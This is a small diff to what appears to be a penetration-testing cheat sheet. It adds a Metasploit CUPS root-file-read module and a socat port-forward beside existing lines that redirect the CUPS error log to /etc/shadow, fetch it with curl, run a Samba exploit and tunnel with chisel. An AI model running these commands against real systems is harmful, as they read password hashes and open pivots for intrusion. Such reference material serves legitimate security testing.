@@ -96,6 +96,7 @@ msf> use exploit/multi/samba/usermap_script
 ```
 $ cupsctl ErrorLog="/etc/shadow"
 $ curl http://<IP address>:631/admin/log/error_log?
+use multi/escalate/cups_root_file_read
 ```
 
 - Rsync (port 873)
@@ -264,6 +265,12 @@ $ proxychains <command>
 https://github.com/jpillora/chisel
 $ sudo ./chisel server -p 8000 --reverse
 $ ./chisel client <IP address>:8000 R:631:127.0.0.1:631
+```
+
+- Socat
+
+```
+$ socat tcp-listen:9090,fork tcp:127.0.0.1:631 &
 ```
 
 - PsExec
